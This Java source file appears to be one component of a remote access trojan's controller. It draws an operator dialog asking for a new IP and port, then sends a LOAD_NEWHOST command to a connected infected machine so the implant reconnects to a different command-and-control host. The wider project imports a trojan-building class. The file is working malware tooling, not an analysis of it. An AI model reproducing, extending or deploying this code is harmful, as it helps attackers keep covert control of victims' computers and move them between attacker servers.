package me.server.receive;

import com.sun.jna.platform.WindowUtils;
import me.server.createtrojan.CreateTrojan;
import me.server.utils.MessageFlags;
import me.server.utils.SendMessage;

import javax.swing.*;
import java.awt.*;
import java.io.InputStream;
import java.net.Socket;

public class LoadNewHost {
    public static void Load(Socket socket) {
        System.setProperty("sun.java2d.noddraw", "true");
        JDialog frame1 = new JDialog();
        WindowUtils.setWindowAlpha(frame1,0.8f);
        JTextField textField = new JTextField(25);
        JTextField textField1 = new JTextField(7);
        frame1.setResizable(false);
        JPanel panel1 = new JPanel();
        JPanel panel2 = new JPanel();
        JLabel label = new JLabel("IP");
        JLabel label1 = new JLabel("端口");
        panel2.add(label);
        panel2.add(textField);
        panel2.add(label1);
        panel2.add(textField1);
        JButton button = new JButton("确定");
        JButton button1 = new JButton("取消");
        panel1.add(button);
        frame1.setTitle("转移主机");
        JTextArea  area1 = new JTextArea();
        area1.setEditable(false);
        area1.append("转移主机" + "\n");
        area1.append("请认真填写IP和端口号,否则无法正常上线!" + "\n");
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        area1.setFont(font);
        JScrollPane scrollPane = new JScrollPane(area1);
        frame1.add(scrollPane,BorderLayout.CENTER);
        frame1.add(panel1,BorderLayout.SOUTH);
        frame1.add(panel2,BorderLayout.NORTH);
        area1.setBackground(Color.BLACK);
        area1.setForeground(Color.green);
        area1.setEditable(false);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(600,350);
        frame1.setVisible(true);
        button.addActionListener(a->{
            String str = "IP:" + textField.getText() + "|" + "Port:" + textField1.getText();
            SendMessage.Send(MessageFlags.LOAD_NEWHOST,str.getBytes(),socket);
            frame1.dispose();
        });
        button1.addActionListener(a->{
            frame1.dispose();
        });
    }
}
